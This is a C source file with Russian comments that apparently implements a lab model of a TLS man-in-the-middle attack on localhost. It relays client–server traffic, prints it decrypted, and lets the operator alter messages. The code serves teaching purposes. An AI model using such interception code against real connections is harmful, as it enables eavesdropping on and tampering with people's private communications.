#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <math.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "common.h"


#define TRUE_SERVER_ADDR "localhost"  // адрес (как бы в итнернете) настоящего сервера
#define TRUE_SERVER_PORT 4433
#define TRUE_SERVER_CERT_FILE "server_cert.pem"  // самоподписаннвй сертификат настоящего сервера

#define MIM_SERVER_ADDR INADDR_ANY  // адрес сетевого устройства, которое будет слушать mim как сервер
#define MIM_SERVER_PORT 9091  // порт сервера min (man-in-the-middle); сервер mim - это сервер, который перехватывает разговор настоящего клиента и сервера
#define MIM_CERT_FILE "mim_cert.pem"  // самоподписанный сертификат mim
#define MIM_PRIKEY_FILE "mim_private.key"  // закрытый ключ, которым этот сертификат подписан


// Функция, перехватывающая передачу между клиентом и сервером:
static void capture_and_decrypt(SSL* true_client_ssl, SSL* true_server_ssl) {
    char buf[BUFFER_LEN];
    size_t bytes;
    int ans;

    SSL* ssl[] = {true_client_ssl, true_server_ssl};  // сокеты с протоколом TLS для общения с клиентом и с сервером
    char* sending[] = {"КЛИЕНТ пытается отправить серверу сообщение:\n",
                        "СЕРВЕР пытается отправить клиенту сообщение:\n"};
    char* stopping[] = {"КЛИЕНТ завершил передачу.\n",
                        "СЕРВЕР завершил передачу.\n"};
    char* redirecting[] = {"--> Отправили сообщение для сервера\n\n",
                        "--> Отправили сообщение для клиента\n\n"};
    while(1) {
        for (int i = 0; i < 2; i ++) {  // по очереди читаем данные от клиента и от сервера
            bytes = recive_ssl(ssl[i], buf, BUFFER_LEN);  // читаем данные от одного
            if (bytes == 0) {
                printf("%s", stopping[i]);
                return;
            }
            printf("%s", sending[i]);
            write(1, buf, bytes);

            printf("\nРазрешить передачу (1 или 0)?\n");  // возможно модифицируем
            scanf("%d", &ans);

            if (ans == 1) 
                printf("сообщение не модифицируем.\n");
            else {
                printf("Введите новое сообщение:\n");
                bytes = read(0, buf, BUFFER_LEN);
            }

            send_ssl(ssl[(i+1)%2], buf, bytes);  // отправляем данные второму
            printf("%s", redirecting[i]);
        }
    }
}


int main() {
    /* программа mim реализует атаку Man-in-the-middle, это значит, что есть
    true_client - настоящий клиент и true_server - настоящий сервер, - они хотят общаться
    между собой по сети, но mim встаёт между ними, перехватывает и расшифровывет весь трафик...
    то есть mim является одновременно и сервером (для true_client) и клиентом для true_server*/


    // инициализиурем библиотеку и контексты:
    SSL_library_init();
    SSL_CTX *mim_client_ctx = init_ctx(0);  // контекст для mim в качестве клиента
    SSL_CTX *mim_server_ctx = init_ctx(1);  // в качестве сервера


    // === MIM в качестве клиента подключается к настоящему серверу ===
    int mim_client = client_tcp_connect(TRUE_SERVER_ADDR, TRUE_SERVER_PORT);  // подключение к серверу
    printf("MIM удалось подключиться к серверу!\n");

    if (SSL_CTX_load_verify_locations(mim_client_ctx, TRUE_SERVER_CERT_FILE, NULL) != 1)  // включаем проверку сертификата сервера
        handleErrors("Не удалось добавить сертификат настоящего сервера!");                                                    
    SSL_CTX_set_verify(mim_client_ctx, SSL_VERIFY_PEER, NULL);

    SSL *true_server_ssl = SSL_new(mim_client_ctx);  // открываем с настоящим сервером TLS соединение
    SSL_set_fd(true_server_ssl, mim_client);

    if (SSL_connect(true_server_ssl) != 1)
        handleErrors("Сертификат сервера, к которому подключились, не подлинный!");
    
    show_certs(true_server_ssl);  // выводим сертификат
    printf("TLS-соединение с СЕРВЕРОМ успешно установлено\n");


    // === MIM в качестве сервера общается с настоящим клиентом ===
    load_certs(mim_server_ctx, MIM_CERT_FILE, MIM_PRIKEY_FILE);  // mim загружает свой сертификат (его он подсунет клиенту...
                                                                 // вообще, если клиент знает открытый ключ, которым подписан сертификат настоящего сервера,
                                                                 // то он не примет сертификат MIM... 
                                                                 // но в нашей модели мы подсунули сертификат MIM в клиент)
    int mim_server = server_tcp_listener(MIM_SERVER_ADDR, MIM_SERVER_PORT);  // создаем tcp-сокет

    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int true_client = accept(mim_server, (struct sockaddr*)&addr, &len);  // к серверу MIM подключается ничего не подозревающий клиент, думая, что подключается с настоящим сервером
    printf("К MIM подключился клиент: %s:%d!\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port)); 

    SSL *true_client_ssl = SSL_new(mim_server_ctx);
    SSL_set_fd(true_client_ssl, true_client);  // открываем TLS поверх соединения с клиентом
    
    if (SSL_accept(true_client_ssl) != 1)  // проверяем, что приняли соединение (что клиент съел сертификат MIM)
        handleErrors("TLS-соединение с клиентом не установлено!\n");
    printf("TLS-соединение с КЛИЕНТОМ успешно установлено\n");


    // Итак, теперь и настоящйи клиент, и настоящий сервер подключены к mim
    printf("\n=== MIM-атака готова! ===\n\n");                                           
    capture_and_decrypt(true_client_ssl, true_server_ssl);  // запускаем перехват трафика


    // завершение общения и освобождение памяти: 
    SSL_shutdown(true_client_ssl);
    SSL_shutdown(true_server_ssl);
    SSL_free(true_client_ssl);
    SSL_free(true_server_ssl);
    SSL_CTX_free(mim_client_ctx);
    SSL_CTX_free(mim_server_ctx);
    close(true_client);
    close(mim_client);
    close(mim_server);

    return 0;
}